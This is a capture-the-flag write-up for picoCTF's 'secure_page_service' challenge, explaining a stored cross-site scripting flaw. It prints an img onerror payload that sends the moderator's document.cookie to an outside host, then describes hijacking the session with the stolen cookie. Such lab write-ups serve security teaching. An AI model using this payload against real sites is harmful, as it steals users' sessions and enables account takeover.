## secure_page_service - 100 (Web Exploitation)
####writeup by Oksisane

### Problem

The bad guys have hidden their access codes on an [anonymous secure page service](http://sps.picoctf.com/). Our intelligence tells us that the codes was posted on a page with id `43440b22864b30a0098f034eaf940730ca211a55`, but unfortunately it's protected by a password, and only site moderators can view the post without the password. Can you help us recover the codes?

### Hint

What happens if you put HTML into a page?

## Answer


### Overview

Exploiting XSS vulurabilities to get Admin user's session cookie.

### Details
Cross-site scripting (commonly reffered to as XSS) is a type of web exploit which invloves an attacker being able to inject client side scripting into pages viewable by other users. First register an account and log in. Then make a simple page such as ```<h1>Hi</hi>``` which produces <h1>Hi</h1> it is clear that secure_page_service is not filtering any html we put into a page and instead is treating as normal, a glaring xss vulnerability. But how can we exploit this? The key here is the Report to Moderator button. We can setup a page that records the moderator's session cookie and then lure them to the page by reporting the page. Once we have their session cookie we can preform a [session hijacking](http://en.wikipedia.org/wiki/Session_hijacking) attack (replace our session with that of the moderators), so that secure_page_service will think we are the moderator and override the password check when we browse to page `43440b22864b30a0098f034eaf940730ca211a55`.
So now we what to do once we have our cookie, but how do we get it?

We can form a tag such as
```html
<img src=/ onerror=location.href=("http://ehsandev.com/pico.php?c="+document.cookie)>
```
What this does is attempt to load an image from /, which will always fail. On error, it redirects (using `location.href`) the user to a page on a server (in this case ehsandev.com) with the cookies of the victim in the url. The attacker can then simply view the log of the get request made to the server and copy out the session id. For example, a user could be directed to `http://ehsandev.com/pico.php?c=PHPSESSID=02b8t6vqgvfigv4at2ovp3e0g6` where `02b8t6vqgvfigv4at2ovp3e0g6` is the session cookie we are looking for and would appear in the access logs of this site. Finally, we have to manually set this to our cookie using a Chrome extension such as [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en) or a Firefox extension such as [Cookies Manager+](https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/). Then, we view the page `43440b22864b30a0098f034eaf940730ca211a55` and we get our flag!
